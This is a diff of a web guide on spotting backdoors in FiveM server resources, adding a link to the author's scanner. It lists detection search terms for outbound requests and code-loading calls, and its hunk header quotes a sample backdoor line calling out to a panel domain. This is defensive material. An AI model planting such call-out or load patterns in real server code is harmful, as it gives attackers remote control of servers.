@@ -516,7 +516,8 @@ PerformHttpRequest(<span class="s">'https://example-panel.xyz/i?k=A1B2'</span>, 
     </ul>
 
     <h2 id="check">5. How to <em>check it yourself</em></h2>
-    <p>A code editor is all you need. Open your server's <code>resources</code> folder in <strong>VS Code</strong> and search across all files (<code>Ctrl + Shift + F</code>). Search for these one by one:</p>
+    <div class="callout ok"><p><strong>Quick way:</strong> Use my <a href="/fivem-backdoor-scanner/">free FiveM backdoor scanner</a>, which runs the searches below automatically. Just drag and drop your resources folder; your files are never uploaded.</p></div>
+    <p>If you'd rather check by hand, a code editor is all you need. Open your server's <code>resources</code> folder in <strong>VS Code</strong> and search across all files (<code>Ctrl + Shift + F</code>). Search for these one by one:</p>
     <ul>
       <li><code>PerformHttpRequest</code>: shows every place that sends requests out</li>
       <li><code>load(</code>, <code>loadstring</code>, <code>assert(load</code>: places that run text as code</li>
